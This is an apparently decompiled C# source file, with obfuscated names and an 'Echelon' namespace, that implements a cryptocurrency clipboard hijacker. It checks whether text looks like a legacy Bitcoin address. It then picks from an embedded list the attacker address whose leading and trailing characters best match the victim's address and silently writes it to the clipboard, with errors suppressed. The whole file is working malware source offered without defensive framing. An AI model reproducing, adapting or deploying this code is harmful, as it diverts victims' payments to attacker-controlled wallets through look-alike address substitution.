using Echelon.Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows;

internal static class e
{
	public static string a = "^(1|3)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";

	internal static bool a(string u)
	{
		string text = u.Trim();
		if (text.Length < 26 || text.Length > 34)
		{
			return false;
		}
		if (!new Regex(e.a).IsMatch(text))
		{
			return false;
		}
		return true;
	}

	internal static void b(string v)
	{
		try
		{
			string text = v.Trim();
			HashSet<string> hashSet = new HashSet<string>();
			int num = 0;
			foreach (string item in Resources.e.Split(new string[1]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries).ToList())
			{
				int num2 = d(item, text);
				if (num2 >= num)
				{
					if (num2 == num)
					{
						hashSet.Add(item);
					}
					else if (num2 > num)
					{
						hashSet.Clear();
						num = num2;
						hashSet.Add(item);
						Clipboard.SetText(item);
					}
				}
			}
			int num3 = 0;
			foreach (string item2 in hashSet)
			{
				int num4 = c(item2, text);
				if (num4 > num3)
				{
					num3 = num4;
					Clipboard.SetText(item2);
				}
			}
		}
		catch
		{
		}
	}

	private static int c(string w, string x)
	{
		int num = 0;
		bool flag = true;
		for (int i = 0; i < Math.Min(w.Length, x.Length) && flag; i++)
		{
			if (w[w.Length - 1 - i] != x[x.Length - 1 - i])
			{
				flag = false;
			}
			else
			{
				num++;
			}
		}
		return num;
	}

	private static int d(string y, string z)
	{
		int num = 0;
		bool flag = true;
		for (int i = 0; i < Math.Min(y.Length, z.Length) && flag; i++)
		{
			if (y[i] != z[i])
			{
				flag = false;
			}
			else
			{
				num++;
			}
		}
		return num;
	}
}
